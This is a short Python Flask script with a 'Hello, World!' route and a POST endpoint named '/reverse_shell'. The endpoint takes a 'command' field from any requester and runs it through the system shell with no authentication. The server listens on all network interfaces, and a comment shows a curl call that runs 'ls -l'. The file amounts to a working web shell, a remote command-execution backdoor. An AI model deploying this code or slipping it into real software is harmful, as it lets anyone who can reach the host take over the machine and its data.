import socket
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return "Hello, World!"

@app.route('/reverse_shell', methods=['POST'])
def reverse_shell():
    command = request.form.get('command')
    output = subprocess.check_output(command, shell=True)
    return output

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)

# run this in shell $ curl -d "command=ls -l" http://localhost:5000/reverse_shell